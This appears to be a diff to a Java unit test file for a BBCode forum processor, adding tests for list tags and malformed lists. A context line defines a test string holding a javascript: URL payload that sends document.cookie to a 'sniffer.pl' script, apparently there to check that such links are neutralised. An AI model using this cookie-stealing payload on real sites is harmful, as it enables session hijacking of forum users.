@@ -16,6 +16,12 @@ public class BBCodeTest {
 
   private static final String JAVASCRIPT_URL = "[url=javascript:var c=new Image();c.src=\"http://127.0.0.1/sniffer.pl?\"+document.cookie;close()]Test[/url]";
 
+  private static final String LIST_TEST="[list][*]1[*]2[/list]";
+  private static final String LIST_RESULT="<ul><li>1<li>2</ul>";
+
+  private static final String BADLIST_TEST="[list]0[*]1[*]2[/list]";
+  private static final String BADLIST_RESULT="<ul><li>1<li>2</ul>";
+
   @Test
   public void testLineBreak() throws BadURLException, SQLException {
     BBCodeProcessor proc = new BBCodeProcessor();
@@ -50,5 +56,23 @@ public class BBCodeTest {
     String result = proc.preparePostText(null, "[code]\"code&code\"[/code]");
 
     assertEquals("<div class=\"code\">&quot;code&amp;code&quot;</div>", result);
+  }
+
+  @Test
+  public void testList() throws BadURLException, SQLException {
+    BBCodeProcessor proc = new BBCodeProcessor();
+
+    String result = proc.preparePostText(null, LIST_TEST);
+
+    assertEquals(LIST_RESULT, result);
+  }
+
+  @Test
+  public void testBadList() throws BadURLException, SQLException {
+    BBCodeProcessor proc = new BBCodeProcessor();
+
+    String result = proc.preparePostText(null, BADLIST_TEST);
+
+    assertEquals(BADLIST_RESULT, result);
   }
 }
